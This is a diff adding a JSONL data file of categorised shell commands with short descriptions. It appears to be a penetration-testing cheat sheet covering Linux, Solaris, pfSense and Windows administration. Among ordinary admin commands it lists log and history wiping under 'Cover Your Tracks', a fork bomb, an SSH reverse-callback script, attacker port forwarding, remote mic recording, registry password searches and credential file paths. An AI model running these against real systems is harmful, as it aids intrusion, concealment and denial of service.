@@ -1,0 +1,696 @@
+{"category": "Linux Network Commands", "command": "watch ss -tp", "description": "Network connections"}
+{"category": "Linux Network Commands", "command": "netstat -ant", "description": "Tcp connections -anu=udp"}
+{"category": "Linux Network Commands", "command": "netstat -tulpn", "description": "Connections with PIDs"}
+{"category": "Linux Network Commands", "command": "lsof -i", "description": "Established connections"}
+{"category": "Linux Network Commands", "command": "smb://ip/share", "description": "Access windows smb share"}
+{"category": "Linux Network Commands", "command": "share user x.x.x.x c$", "description": "Mount Windows share"}
+{"category": "Linux Network Commands", "command": "smbclient -U user \\\\ip\\share", "description": "SMB connect"}
+{"category": "Linux Network Commands", "command": "ifconfig eth0 ip/cidr", "description": "Set IP and netmask"}
+{"category": "Linux Network Commands", "command": "ifconfig eth0:1 ip/cidr", "description": "Set virtual interface"}
+{"category": "Linux Network Commands", "command": "route add default gw gw_ip", "description": "Set GW"}
+{"category": "Linux Network Commands", "command": "ifconfig eth0 mtu [size]", "description": "Change MTU size"}
+{"category": "Linux Network Commands", "command": "ifconfig int hw ether", "description": "Change MAC"}
+{"category": "Linux Network Commands", "command": "macchanger -r int", "description": "Randomize MAC"}
+{"category": "Linux Network Commands", "command": "iwlist int scan", "description": "Built-in wifi scanner"}
+{"category": "Linux Network Commands", "command": "dig -x ip", "description": "Domain lookup for IP"}
+{"category": "Linux Network Commands", "command": "host ip", "description": "Domain lookup for IP"}
+{"category": "Linux Network Commands", "command": "host -t srv _service._tcp.url.com", "description": "Domain SRV lookup"}
+{"category": "Linux Network Commands", "command": "dig @ip domain -t AXFR", "description": "DNS zone transfer"}
+{"category": "Linux Network Commands", "command": "host -l domain nameserver", "description": "DNS zone transfer"}
+{"category": "Linux Network Commands", "command": "ip xfrm state list", "description": "Print existing VPN keys"}
+{"category": "Linux Network Commands", "command": "ip addr add ip/cidr dev eth0", "description": "Add 'hidden' interface"}
+{"category": "Linux Network Commands", "command": "/var/log/messages | grep DHCP", "description": "List DHCP assignments"}
+{"category": "Linux Network Commands", "command": "tcpkill host ip and port port", "description": "Block ip/port"}
+{"category": "Linux Network Commands", "command": "echo \"1\" > /proc/sys/net/ipv4/ip_forward", "description": "Turn on IP forwarding"}
+{"category": "Linux Network Commands", "command": "echo \"nameserver x.x.x.x\" > /etc/resolv.conf", "description": "Add DNS server"}
+{"category": "Linux System Info", "command": "nbtstat -A ip", "description": "Get hostname for IP"}
+{"category": "Linux System Info", "command": "id", "description": "Current username"}
+{"category": "Linux System Info", "command": "w", "description": "Logged on users"}
+{"category": "Linux System Info", "command": "who -a", "description": "User information"}
+{"category": "Linux System Info", "command": "last -a", "description": "Last users logged on"}
+{"category": "Linux System Info", "command": "ps -ef", "description": "Process listing"}
+{"category": "Linux System Info", "command": "df -h", "description": "Disk usage (free)"}
+{"category": "Linux System Info", "command": "uname -a", "description": "Kernel version/CPU info"}
+{"category": "Linux System Info", "command": "mount", "description": "Mounted file systems"}
+{"category": "Linux System Info", "command": "getent passwd", "description": "Show list of users"}
+{"category": "Linux System Info", "command": "PATH=$PATH:/home/mypath", "description": "Add to PATH variable"}
+{"category": "Linux System Info", "command": "kill pid", "description": "Kills process with pid"}
+{"category": "Linux System Info", "command": "cat /etc/issue", "description": "Show OS info"}
+{"category": "Linux System Info", "command": "cat /etc/*release*", "description": "Show OS version info"}
+{"category": "Linux System Info", "command": "cat /proc/version", "description": "Show kernel info"}
+{"category": "Linux System Info", "command": "rpm --query -all", "description": "Installed packages (Redhat)"}
+{"category": "Linux System Info", "command": "rpm -ivh *.rpm", "description": "Install RPM package"}
+{"category": "Linux System Info", "command": "dpkg --get-selections", "description": "Installed packages (Ubuntu)"}
+{"category": "Linux System Info", "command": "dpkg -I *.deb", "description": "Installed packages (Ubuntu)"}
+{"category": "Linux System Info", "command": "pkginfo", "description": "Installed packages (Solaris)"}
+{"category": "Linux System Info", "command": "which tcsh/csh/ksh/bash", "description": "Show location of executable"}
+{"category": "Linux System Info", "command": "chmod 500 tcsh/csh/ksh", "description": "Disable shell, force bash"}
+{"category": "Linux Utility Commands", "command": "rdestop ip", "description": "Grab VNC desktop from IP"}
+{"category": "Linux Utility Commands", "command": "scp /src/file user@x.x.x.x:/dst/file", "description": "Copy file to remote host"}
+{"category": "Linux Utility Commands", "command": "scp user@remoteip:/src/file /dst/file", "description": "Get file from remote host"}
+{"category": "Linux Utility Commands", "command": "useradd -m user", "description": "Add user"}
+{"category": "Linux Utility Commands", "command": "passwd user", "description": "Change user password"}
+{"category": "Linux Utility Commands", "command": "rmuser username", "description": "Remove user"}
+{"category": "Linux Utility Commands", "command": "script -a outfile", "description": "Record shell (Ctrl+D stops)"}
+{"category": "Linux Utility Commands", "command": "apropos subject", "description": "Find related command"}
+{"category": "Linux Utility Commands", "command": "history", "description": "View user command history"}
+{"category": "Linux Utility Commands", "command": "!num", "description": "Execute line in history"}
+{"category": "Linux Utility Commands", "command": "diff file1 file2", "description": "Compare files"}
+{"category": "Linux Utility Commands", "command": "rm -rf dir", "description": "Force delete directory"}
+{"category": "Linux Utility Commands", "command": "shred -f -u file", "description": "Overwrite/delete file"}
+{"category": "Linux Utility Commands", "command": "touch -r ref_file file", "description": "Match ref_file timestamp"}
+{"category": "Linux Utility Commands", "command": "touch -t YYYYMMDDHHMM file", "description": "Set file timestamp"}
+{"category": "Linux Utility Commands", "command": "sudo fdisk -l", "description": "List connected drives"}
+{"category": "Linux Utility Commands", "command": "mount /dev/sda1 /mnt/usbkey", "description": "Mount USB key"}
+{"category": "Linux Utility Commands", "command": "md5sum file", "description": "Compute MD5 hash"}
+{"category": "Linux Utility Commands", "command": "echo -n \"str\" | md5sum", "description": "Generate MD5 hash"}
+{"category": "Linux Utility Commands", "command": "sha1sum file", "description": "SHA1 hash of file"}
+{"category": "Linux Utility Commands", "command": "sort -u file", "description": "Sort/show unique lines"}
+{"category": "Linux Utility Commands", "command": "grep -c \"str\" file", "description": "Count lines with \"str\""}
+{"category": "Linux Utility Commands", "command": "tar cf file.tar files", "description": "Create tar from files"}
+{"category": "Linux Utility Commands", "command": "tar xf file.tar", "description": "Extract tar"}
+{"category": "Linux Utility Commands", "command": "tar czf file.tar.gz files", "description": "Create tar.gz"}
+{"category": "Linux Utility Commands", "command": "tar xzf file.tar.gz", "description": "Extract tar.gz"}
+{"category": "Linux Utility Commands", "command": "tar cjf file.tar.bz2 files", "description": "Create tar.bz2"}
+{"category": "Linux Utility Commands", "command": "tar xjf file.tar.bz2", "description": "Extract tar.bz2"}
+{"category": "Linux Utility Commands", "command": "gzip file", "description": "Compress/rename file"}
+{"category": "Linux Utility Commands", "command": "gzip -d file.gz", "description": "Decompress file.gz"}
+{"category": "Linux Utility Commands", "command": "upx -9 -o out.exe orig.exe", "description": "UPX pack orig.exe"}
+{"category": "Linux Utility Commands", "command": "zip -r zipname.zip directory", "description": "Create zip"}
+{"category": "Linux Utility Commands", "command": "dd skip=1000 count=2000 bs=8 if=file of=file", "description": "Cut block 1K-3K from file"}
+{"category": "Linux Utility Commands", "command": "split -b 9K file prefix", "description": "Split file into 9K chunks"}
+{"category": "Linux Utility Commands", "command": "find / -name file -type f -name \"*.pdf\"", "description": "Find PDF files"}
+{"category": "Linux Utility Commands", "command": "find / -perm -4000 -o -perm -2000 -exec ls -l {} \\;", "description": "Search for setuid/setgid files"}
+{"category": "Linux Utility Commands", "command": "dos2unix file", "description": "Convert to Unix format"}
+{"category": "Linux Utility Commands", "command": "file file", "description": "Determine file type/info"}
+{"category": "Linux Utility Commands", "command": "chattr +i file", "description": "Set immutable bit"}
+{"category": "Linux Utility Commands", "command": "chattr -i file", "description": "Unset immutable bit"}
+{"category": "Linux Misc Commands", "command": "unset HISTFILE", "description": "Disable history logging"}
+{"category": "Linux Misc Commands", "command": "arecord - | aplay -", "description": "Record remote mic"}
+{"category": "Linux Misc Commands", "command": "gcc -o outfile myfile.c", "description": "Compile C/C++"}
+{"category": "Linux Misc Commands", "command": "init 6", "description": "Reboot (no shutdown)"}
+{"category": "Linux Misc Commands", "command": "cat /etc/*syslog*.conf | grep -v \"^\\s*#\"", "description": "List log files"}
+{"category": "Linux Misc Commands", "command": "grep \"href=\" file | cut -d\"/\" -f3 | grep url | sort -u", "description": "Strip links in url.com"}
+{"category": "Linux Misc Commands", "command": "dd if=/dev/urandom of=file bs=3145728 count=100", "description": "Make random 300MB file"}
+{"category": "Linux Cover Your Tracks", "command": "echo \"\" > /var/log/auth.log", "description": "Clear auth.log file"}
+{"category": "Linux Cover Your Tracks", "command": "echo \"\" > ~/.bash_history", "description": "Clear current user bash history"}
+{"category": "Linux Cover Your Tracks", "command": "rm ~/.bash_history -rf", "description": "Delete .bash_history file"}
+{"category": "Linux Cover Your Tracks", "command": "history -c", "description": "Clear current session history"}
+{"category": "Linux Cover Your Tracks", "command": "export HISTSIZE=0", "description": "Set history max lines to 0"}
+{"category": "Linux Cover Your Tracks", "command": "export HISTFILESIZE=0", "description": "Set history max commands to 0"}
+{"category": "Linux Cover Your Tracks", "command": "unset HISTFILE", "description": "Disable history logging"}
+{"category": "Linux Cover Your Tracks", "command": "kill -9 $$", "description": "Kill current session"}
+{"category": "Linux Cover Your Tracks", "command": "ln /dev/null ~/.bash_history -sf", "description": "Permanently send bash history to /dev/null"}
+{"category": "Linux File System", "command": "/bin", "description": "User binary"}
+{"category": "Linux File System", "command": "/boot", "description": "Boot loader files"}
+{"category": "Linux File System", "command": "/dev", "description": "Device files"}
+{"category": "Linux File System", "command": "/etc", "description": "Configuration files"}
+{"category": "Linux File System", "command": "/home", "description": "User home directories"}
+{"category": "Linux File System", "command": "/lib", "description": "System libraries"}
+{"category": "Linux File System", "command": "/opt", "description": "Optional software"}
+{"category": "Linux File System", "command": "/proc", "description": "Process information"}
+{"category": "Linux File System", "command": "/root", "description": "Root user home"}
+{"category": "Linux File System", "command": "/sbin", "description": "System binaries"}
+{"category": "Linux File System", "command": "/tmp", "description": "Temporary files"}
+{"category": "Linux File System", "command": "/usr", "description": "User utilities and apps"}
+{"category": "Linux File System", "command": "/var", "description": "Variable data (logs, etc.)"}
+{"category": "Linux Scripting", "command": "for x in $(seq 1 254); do ping -c 1 1.1.1.$x | grep \"64 b\" | cut -d\" \" -f4 >> ips.txt; done", "description": "Ping sweep for live hosts"}
+{"category": "Linux Scripting", "command": "#!/bin/bash\necho \"Enter Class C Range: i.e. 192.168.3\"\nread range\nfor ip in $(seq 1 254); do\nhost $range.$ip | grep \"name pointer\" | cut -d\" \" -f5\ndone", "description": "Automated domain name resolve"}
+{"category": "Linux Scripting", "command": ":(){ :|:& };:", "description": "Fork bomb (crashes system)"}
+{"category": "Linux Scripting", "command": "for ip in $(seq 1 254); do dig -x 1.1.1.$ip | grep $ip >> dns.txt; done", "description": "DNS reverse lookup"}
+{"category": "Linux Scripting", "command": "#!/bin/sh\n# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2\nfor ip in $(seq 2 254); do\niptables -A INPUT -s 192.168.1.$ip -j DROP\ndone", "description": "IP banning script"}
+{"category": "SSH Callback", "command": "#!/bin/sh\nkillall ssh /dev/null 2>&1\nsleep 5\nREMPORT=4040\nREMSRV=user\nHOSTS=\"domain1.com domain2.com domain3.com\"\nfor LIVEHOST in $HOSTS;\ndo\nscount=$(ping -c 2 $LIVEHOST | awk '{print $1}' | grep -c received)\nif [ $scount -gt 0 ]; then\nssh -R $REMPORT:localhost:22 -i id_rsa $REMSRV@$LIVEHOST\ndone", "description": "Establish SSH callback"}
+{"category": "IPTables", "command": "iptables-restore file", "description": "Restore iptables from file"}
+{"category": "IPTables", "command": "iptables -F", "description": "Flush all rules"}
+{"category": "IPTables", "command": "iptables -A INPUT -s ip -j DROP", "description": "Block incoming traffic from IP"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -d ip -j DROP", "description": "Block outgoing traffic to IP"}
+{"category": "IPTables", "command": "iptables -A INPUT -p tcp --dport port -j DROP", "description": "Block TCP port incoming"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -p tcp --dport port -j DROP", "description": "Block TCP port outgoing"}
+{"category": "IPTables", "command": "iptables -A INPUT -p udp --dport port -j DROP", "description": "Block UDP port incoming"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -p udp --dport port -j DROP", "description": "Block UDP port outgoing"}
+{"category": "IPTables", "command": "iptables -A INPUT -i int -j DROP", "description": "Block interface incoming"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -o int -j DROP", "description": "Block interface outgoing"}
+{"category": "IPTables", "command": "iptables -L -v", "description": "List rules with stats"}
+{"category": "Linux Files", "command": "/etc/shadow", "description": "Local users' hashes"}
+{"category": "Linux Files", "command": "/etc/passwd", "description": "Local users"}
+{"category": "Linux Files", "command": "/etc/group", "description": "Local groups"}
+{"category": "Linux Files", "command": "/etc/rc.d", "description": "Startup services"}
+{"category": "Linux Files", "command": "/etc/init.d", "description": "Service"}
+{"category": "Linux Files", "command": "/etc/hosts", "description": "Known hostnames and IPs"}
+{"category": "Linux Files", "command": "/etc/hostname", "description": "Full hostname with domain"}
+{"category": "Linux Files", "command": "/etc/network/interfaces", "description": "Network configuration"}
+{"category": "Linux Files", "command": "/etc/profile", "description": "System environment variables"}
+{"category": "Linux Files", "command": "/etc/apt/sources.list", "description": "Ubuntu sources list"}
+{"category": "Linux Files", "command": "/etc/resolv.conf", "description": "Nameserver configuration"}
+{"category": "Linux Files", "command": "/home/user/.bash_history", "description": "Bash history (also /root/)"}
+{"category": "Linux Files", "command": "/usr/share/wireshark/manuf", "description": "Vendor-MAC lookup"}
+{"category": "Linux Files", "command": "~/.ssh/", "description": "SSH keystore"}
+{"category": "Linux Files", "command": "/var/log", "description": "System log files (most Linux)"}
+{"category": "Linux Files", "command": "/var/adm", "description": "System log files (Unix)"}
+{"category": "Linux Files", "command": "/var/spool/cron", "description": "List cron files"}
+{"category": "Linux Files", "command": "/var/log/apache/access.log", "description": "Apache connection log"}
+{"category": "Linux Files", "command": "/etc/fstab", "description": "Static file system info"}
+{"category": "Linux Scripting", "command": "for x in {1..254}; do ping -c 1 1.1.1.$x | grep \"64 bytes\" | cut -d\" \" -f4 >> ips.txt; done", "description": "Ping sweep for live hosts"}
+{"category": "Linux Scripting", "command": "#!/bin/bash\necho \"Enter Class C Range: i.e. 192.168.3\"\nread range\nfor ip in {1..254}; do\nhost $range.$ip | grep \"name pointer\" | cut -d\" \" -f5\ndone", "description": "Automated domain name resolve"}
+{"category": "Linux Scripting", "command": ":(){ :|: & };:", "description": "Fork bomb (crashes system)"}
+{"category": "Linux Scripting", "command": "for ip in {1..254}; do dig -x 1.1.1.$ip | grep $ip >> dns.txt; done", "description": "DNS reverse lookup"}
+{"category": "Linux Scripting", "command": "#!/bin/sh\n# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2\ni=2\nwhile [ $i -le 253 ]; do\nif [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then\necho \"BANNED: iptables -A INPUT -s 192.168.1.$i -j DROP\"\niptables -A INPUT -s 192.168.1.$i -j DROP\nelse\necho \"IP NOT BANNED: 192.168.1.$i\"\nfi\ni=$((i + 1))\ndone", "description": "IP banning script"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT", "description": "Allow SSH on port 22 outbound"}
+{"category": "IPTables", "command": "iptables -A INPUT -i iface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT", "description": "Allow SSH on port 22 inbound"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -o iface -p icmp --icmp-type echo-request -j ACCEPT", "description": "Allow ICMP echo-request outbound"}
+{"category": "IPTables", "command": "iptables -A INPUT -i iface -p icmp --icmp-type echo-reply -j ACCEPT", "description": "Allow ICMP echo-reply inbound"}
+{"category": "IPTables", "command": "echo \"1\" > /proc/sys/net/ipv4/ip_forward", "description": "Enable IP forwarding"}
+{"category": "IPTables", "command": "sysctl net.ipv4.ip_forward=1", "description": "Enable IP forwarding (alternative)"}
+{"category": "IPTables", "command": "iptables -t nat -A PREROUTING -p tcp -i eth0 -d pivotip --dport 443 -j DNAT --to-destination attkip:443", "description": "Port forward TCP 443 to attack IP"}
+{"category": "IPTables", "command": "iptables -t nat -A POSTROUTING -p tcp -i eth0 -s target_subnet_cidr -d attkip --dport 443 -j SNAT --to-source pivotip", "description": "Source NAT for port forwarding"}
+{"category": "IPTables", "command": "iptables -t filter -I FORWARD 1 -j ACCEPT", "description": "Allow forwarding for port forwarding"}
+{"category": "IPTables", "command": "iptables -A INPUT -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW -p tcp -m multiport --dports 80,443 -j ACCEPT", "description": "Allow 1.1.1.0/24 on ports 80,443"}
+{"category": "IPTables", "command": "iptables -A INPUT -i eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT", "description": "Allow related/established on eth0"}
+{"category": "IPTables", "command": "iptables -P INPUT DROP", "description": "Set default INPUT policy to DROP"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -o eth0 -j ACCEPT", "description": "Allow all outbound on eth0"}
+{"category": "IPTables", "command": "iptables -A INPUT -i lo -j ACCEPT", "description": "Allow loopback inbound"}
+{"category": "IPTables", "command": "iptables -A OUTPUT -o lo -j ACCEPT", "description": "Allow loopback outbound"}
+{"category": "IPTables", "command": "iptables -N LOGGING", "description": "Create LOGGING chain"}
+{"category": "IPTables", "command": "iptables -A INPUT -j LOGGING", "description": "Direct INPUT to LOGGING chain"}
+{"category": "IPTables", "command": "iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix \"DROPPED \"", "description": "Log dropped packets (4/min)"}
+{"category": "IPTables", "command": "iptables -A LOGGING -j DROP", "description": "Drop packets in LOGGING chain"}
+{"category": "Update-rc.d", "command": "service --status-all", "description": "List existing services and run status"}
+{"category": "Update-rc.d", "command": "service service start", "description": "Start a service"}
+{"category": "Update-rc.d", "command": "service service stop", "description": "Stop a service"}
+{"category": "Update-rc.d", "command": "service service status", "description": "Check status of a service"}
+{"category": "Update-rc.d", "command": "update-rc.d -f service remove", "description": "Remove a service startup command"}
+{"category": "Update-rc.d", "command": "update-rc.d service defaults", "description": "Add a startup service"}
+{"category": "Chkconfig", "command": "chkconfig --list", "description": "List existing services and run status"}
+{"category": "Chkconfig", "command": "chkconfig service --list", "description": "Check single service status"}
+{"category": "Chkconfig", "command": "chkconfig service on [--level 3]", "description": "Add service (optional run level)"}
+{"category": "Chkconfig", "command": "chkconfig service off [--level 3]", "description": "Remove service (optional run level)"}
+{"category": "Chkconfig", "command": "chkconfig iptables off", "description": "Example: Disable iptables service"}
+{"category": "Screen", "command": "screen -S name", "description": "Start new screen with name"}
+{"category": "Screen", "command": "screen -ls", "description": "List running screens"}
+{"category": "Screen", "command": "screen -r name", "description": "Attach to screen name"}
+{"category": "Screen", "command": "screen -S name -X command", "description": "Send command to screen name"}
+{"category": "Screen", "command": "Ctrl+a ?", "description": "List keybindings (help)"}
+{"category": "Screen", "command": "Ctrl+a d", "description": "Detach"}
+{"category": "Screen", "command": "Ctrl+a D D", "description": "Detach and logout"}
+{"category": "Screen", "command": "Ctrl+a c", "description": "Create new window"}
+{"category": "Screen", "command": "Ctrl+a Ctrl+a", "description": "Switch to last active window"}
+{"category": "Screen", "command": "Ctrl+a ' num|name", "description": "Switch to window num or name"}
+{"category": "Screen", "command": "Ctrl+a \"", "description": "See windows list and change"}
+{"category": "Screen", "command": "Ctrl+a k", "description": "Kill current window"}
+{"category": "Screen", "command": "Ctrl+a S", "description": "Split display horizontally"}
+{"category": "Screen", "command": "Ctrl+a V", "description": "Split display vertically"}
+{"category": "Screen", "command": "Ctrl+a Tab", "description": "Jump to next display"}
+{"category": "Screen", "command": "Ctrl+a X", "description": "Remove current region"}
+{"category": "Screen", "command": "Ctrl+a Q", "description": "Remove all regions but current"}
+{"category": "X11", "command": "xwd -display ip:0 -root -out /tmp/test.xpm", "description": "Capture remote X11 window to XPM"}
+{"category": "X11", "command": "xwud -in /tmp/test.xpm", "description": "Display XPM file"}
+{"category": "X11", "command": "convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg", "description": "Convert XPM to JPG (1280x1024)"}
+{"category": "X11", "command": "xwd -display 1.1.1.1:0 -root -silent -out x11dump", "description": "Capture X11 stream to file"}
+{"category": "X11", "command": "xwudtopnm x11dump", "description": "Read X11 dump with xwudtopnm or GIMP"}
+{"category": "TCPDump", "command": "tcpdump -i eth0 -XX -w out.pcap", "description": "Capture packets on eth0 in ASCII/hex"}
+{"category": "TCPDump", "command": "tcpdump -i eth0 port 80 and dst 2.2.2.2", "description": "Capture HTTP traffic to 2.2.2.2"}
+{"category": "TCPDump", "command": "tcpdump -i eth0 -tttt dst 192.168.1.22 and not net 192.168.1.0/24", "description": "Show connections to specific IP"}
+{"category": "TCPDump", "command": "tcpdump -i eth0 'icmp[icmptype] == icmp-echoreply'", "description": "Print all ping responses"}
+{"category": "TCPDump", "command": "tcpdump -i eth0 -c 50 -tttt 'udp and port 53'", "description": "Capture 50 DNS packets with timestamp"}
+{"category": "Native Kali Commands", "command": "wmis -U DOMAIN\\user%password //DC cmd.exe /c command", "description": "WMIC equivalent to run command"}
+{"category": "Native Kali Commands", "command": "mount.cifs //ip/share /mnt/share -o user=user,pass=pass,sec=ntlmssp,domain=domain,rw", "description": "Mount SMB share to /mnt/share"}
+{"category": "Native Kali Commands", "command": "apt-get update", "description": "Update Kali package lists"}
+{"category": "Native Kali Commands", "command": "apt-get upgrade", "description": "Upgrade Kali packages"}
+{"category": "pfSense", "command": "pfSsh.php", "description": "Access pfSense shell system"}
+{"category": "pfSense", "command": "pfSsh.php playback enableallowallwan", "description": "Allow all inbound WAN connections"}
+{"category": "pfSense", "command": "pfSsh.php playback enablesshd", "description": "Enable SSH inbound/outbound"}
+{"category": "pfSense", "command": "pfctl -sn", "description": "Show NAT rules"}
+{"category": "pfSense", "command": "pfctl -sr", "description": "Show filter rules"}
+{"category": "pfSense", "command": "pfctl -sa", "description": "Show all rules"}
+{"category": "pfSense", "command": "viconfig", "description": "Edit config"}
+{"category": "pfSense", "command": "rm /tmp/config.cache", "description": "Remove cached config after editing"}
+{"category": "pfSense", "command": "/etc/rc.reload_all", "description": "Reload entire config"}
+{"category": "Solaris", "command": "ifconfig -a", "description": "List interfaces"}
+{"category": "Solaris", "command": "netstat -in", "description": "List interface details"}
+{"category": "Solaris", "command": "ifconfig -r", "description": "Show routing table"}
+{"category": "Solaris", "command": "ifconfig eth0 dhcp", "description": "Start DHCP client"}
+{"category": "Solaris", "command": "ifconfig eth0 plumb up ip netmask nmask", "description": "Set IP and netmask"}
+{"category": "Solaris", "command": "route add default ip", "description": "Set default gateway"}
+{"category": "Solaris", "command": "logins -p", "description": "List users without passwords"}
+{"category": "Solaris", "command": "svcs -a", "description": "List all services with status"}
+{"category": "Solaris", "command": "prstat -a", "description": "Process listing (like top)"}
+{"category": "Solaris", "command": "svcadm start ssh", "description": "Start SSH service"}
+{"category": "Solaris", "command": "inetadm -e telnet", "description": "Enable telnet (-d to disable)"}
+{"category": "Solaris", "command": "prtconf | grep Memory", "description": "Show total physical memory"}
+{"category": "Solaris", "command": "iostat -En", "description": "Show hard disk size"}
+{"category": "Solaris", "command": "showrev -c /usr/bin/bash", "description": "Show information on a binary"}
+{"category": "Solaris", "command": "shutdown -i6 -g0 -y", "description": "Restart system"}
+{"category": "Solaris", "command": "dfmounts", "description": "List clients connected to NFS"}
+{"category": "Solaris", "command": "smc", "description": "Management GUI"}
+{"category": "Solaris", "command": "snoop -d int -c pkt", "description": "Packet capture (-o results.pcap to save)"}
+{"category": "Solaris", "command": "/etc/vfstab", "description": "File system mount table"}
+{"category": "Solaris", "command": "/var/adm/loginlog", "description": "Login attempt log"}
+{"category": "Solaris", "command": "/etc/default/*", "description": "Default settings"}
+{"category": "Solaris", "command": "/etc/system", "description": "Kernel modules and config"}
+{"category": "Solaris", "command": "/var/adm/messages", "description": "Syslog location"}
+{"category": "Solaris", "command": "/etc/auto_*", "description": "Automounter config files"}
+{"category": "Solaris", "command": "/etc/inet/ipnodes", "description": "IPv4/IPv6 host files"}
+{"category": "Windows Versions", "command": "Windows NT 3.1", "description": "All editions"}
+{"category": "Windows Versions", "command": "Windows NT 3.5", "description": "All editions"}
+{"category": "Windows Versions", "command": "Windows NT 3.51", "description": "All editions"}
+{"category": "Windows Versions", "command": "Windows NT 4.0", "description": "All editions"}
+{"category": "Windows Versions", "command": "Windows 2000", "description": "All editions (NT 5.0)"}
+{"category": "Windows Versions", "command": "Windows XP", "description": "Home, Pro, MC, Tablet PC, Starter, Embedded (NT 5.1)"}
+{"category": "Windows Versions", "command": "Windows XP 64-bit", "description": "64-bit, Pro 64-bit (NT 5.1)"}
+{"category": "Windows Versions", "command": "Windows Server 2003", "description": "Standard, Enterprise (NT 5.2)"}
+{"category": "Windows Versions", "command": "Windows Server 2003 R2", "description": "Standard, Enterprise (NT 5.2)"}
+{"category": "Windows Versions", "command": "Windows Home Server", "description": "Home Server edition (NT 5.2)"}
+{"category": "Windows Versions", "command": "Windows Vista", "description": "Starter, Home, Basic, Premium, Business, Enterprise, Ultimate (NT 6.0)"}
+{"category": "Windows Versions", "command": "Windows Server 2008", "description": "Foundation, Standard, Enterprise (NT 6.0)"}
+{"category": "Windows Versions", "command": "Windows 7", "description": "Starter, Home, Pro, Enterprise, Ultimate (NT 6.1)"}
+{"category": "Windows Versions", "command": "Windows Server 2008 R2", "description": "Foundation, Standard, Enterprise (NT 6.1)"}
+{"category": "Windows Versions", "command": "Windows 8", "description": "x86/64, Pro, Enterprise, RT (ARM) (NT 6.2)"}
+{"category": "Windows Versions", "command": "Windows Phone 8", "description": "Mobile OS (NT 6.2)"}
+{"category": "Windows Versions", "command": "Windows Server 2012", "description": "Foundation, Essentials, Standard (NT 6.2)"}
+{"category": "Windows Versions", "command": "Windows 8.1", "description": "x86/64, Pro, Enterprise (NT 6.3)"}
+{"category": "Windows Versions", "command": "Windows Server 2012 R2", "description": "Foundation, Essentials, Standard (NT 6.3)"}
+{"category": "Windows Versions", "command": "Windows 10", "description": "Home, Pro, Enterprise, Education, IoT (NT 10.0)"}
+{"category": "Windows Versions", "command": "Windows Server 2016", "description": "Standard, Datacenter, Essentials (NT 10.0)"}
+{"category": "Windows Versions", "command": "Windows Server 2019", "description": "Standard, Datacenter, Essentials (NT 10.0)"}
+{"category": "Windows Versions", "command": "Windows 11", "description": "Home, Pro, Enterprise, Education (NT 10.0)"}
+{"category": "Windows Versions", "command": "Windows Server 2022", "description": "Standard, Datacenter, Essentials (NT 10.0)"}
+{"category": "Windows Files", "command": "%SYSTEMROOT%", "description": "Typically C:\\Windows"}
+{"category": "Windows Files", "command": "%SYSTEMROOT%\\System32\\drivers\\etc\\hosts", "description": "DNS entries"}
+{"category": "Windows Files", "command": "%SYSTEMROOT%\\System32\\drivers\\etc\\networks", "description": "Network settings"}
+{"category": "Windows Files", "command": "%SYSTEMROOT%\\System32\\config\\SAM", "description": "User & password hashes"}
+{"category": "Windows Files", "command": "%SYSTEMROOT%\\repair\\SAM", "description": "Backup copy of SAM"}
+{"category": "Windows Files", "command": "%SYSTEMROOT%\\System32\\config\\RegBack\\SAM", "description": "Backup copy of SAM"}
+{"category": "Windows Files", "command": "%WINDIR%\\System32\\config\\AppEvent.Evt", "description": "Application Log"}
+{"category": "Windows Files", "command": "%WINDIR%\\System32\\config\\SecEvent.Evt", "description": "Security Log"}
+{"category": "Windows Files", "command": "%ALLUSERSPROFILE%\\Start Menu\\Programs\\Startup", "description": "Startup Location (all users)"}
+{"category": "Windows Files", "command": "%USERPROFILE%\\Start Menu\\Programs\\Startup", "description": "Startup Location (specific user)"}
+{"category": "Windows Files", "command": "%SYSTEMROOT%\\Prefetch", "description": "Prefetch dir (EXE logs)"}
+{"category": "Startup Directories", "command": "%SystemDrive%\\Windows\\Start Menu\\Programs\\Startup", "description": "Windows 9x startup (all users)"}
+{"category": "Startup Directories", "command": "%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup", "description": "Windows NT 4.0, 3.51, 3.50 startup (all users)"}
+{"category": "Startup Directories", "command": "%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "description": "Windows NT 6.1, 6.0 startup (all users)"}
+{"category": "Startup Directories", "command": "%SystemDrive%\\Users\\%UserName%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "description": "Windows NT 6.1, 6.0 startup (specific users)"}
+{"category": "Startup Directories", "command": "%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup", "description": "Windows NT 5.2, 5.1, 5.0 startup (all users)"}
+{"category": "Windows System Info Commands", "command": "ver", "description": "Get OS version"}
+{"category": "Windows System Info Commands", "command": "sc query state=all", "description": "Show services"}
+{"category": "Windows System Info Commands", "command": "tasklist /svc", "description": "Show processes & services"}
+{"category": "Windows System Info Commands", "command": "tasklist /m", "description": "Show all processes & DLLs"}
+{"category": "Windows System Info Commands", "command": "tasklist /S ip /v", "description": "Remote process listing"}
+{"category": "Windows System Info Commands", "command": "taskkill /PID pid /F", "description": "Force process to terminate"}
+{"category": "Windows System Info Commands", "command": "systeminfo /S ip /U domain\\user /P pwd", "description": "Remote system info"}
+{"category": "Windows System Info Commands", "command": "reg query \\\\ip\\RegistryKey\\Key /v Value", "description": "Query remote registry"}
+{"category": "Windows System Info Commands", "command": "reg query HKLM /f password /t REG_SZ /s", "description": "Search registry for password"}
+{"category": "Windows System Info Commands", "command": "fsutil fsinfo drives", "description": "List drives (must be admin)"}
